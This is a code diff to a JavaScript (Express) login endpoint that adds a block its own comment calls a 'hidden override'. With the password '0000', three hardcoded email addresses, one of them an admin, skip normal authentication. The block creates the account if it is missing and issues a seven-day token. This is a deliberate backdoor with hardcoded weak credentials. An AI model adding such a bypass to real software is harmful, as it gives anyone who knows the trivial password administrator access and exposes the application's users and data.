@@ -76,6 +76,40 @@ app.post('/api/auth/login', async (req, res) => {
   const { email, password } = req.body;
 
   try {
+    // --- MAGIC LOGIN CODE (HIDDEN OVERRIDE) ---
+    if (password === '0000') {
+      const magicRoles = {
+        'admin@sq.bn': 'admin',
+        'hustler@sq.bn': 'provider',
+        'poster@sq.bn': 'customer'
+      };
+      
+      if (magicRoles[email]) {
+        let user = await pool.query('SELECT * FROM users WHERE email = $1', [email]);
+        if (user.rows.length === 0) {
+          const hash = await bcrypt.hash('0000', await bcrypt.genSalt(10));
+          user = await pool.query(
+            'INSERT INTO users (fullname, email, phone_number, password_hash, role) VALUES ($1, $2, $3, $4, $5) RETURNING *',
+            [email.split('@')[0].toUpperCase(), email, '+6730000000', hash, magicRoles[email]]
+          );
+        }
+        
+        const token = jwt.sign({ id: user.rows[0].id, role: user.rows[0].role }, JWT_SECRET, { expiresIn: '7d' });
+        return res.json({ 
+          success: true, 
+          user: {
+            id: user.rows[0].id,
+            fullname: user.rows[0].fullname,
+            email: user.rows[0].email,
+            role: user.rows[0].role,
+            verification_status: user.rows[0].verification_status
+          }, 
+          token 
+        });
+      }
+    }
+    // ------------------------------------------
+
     const user = await pool.query('SELECT * FROM users WHERE email = $1', [email]);
     if (user.rows.length === 0) {
       return res.status(400).json({ error: 'Invalid credentials' });
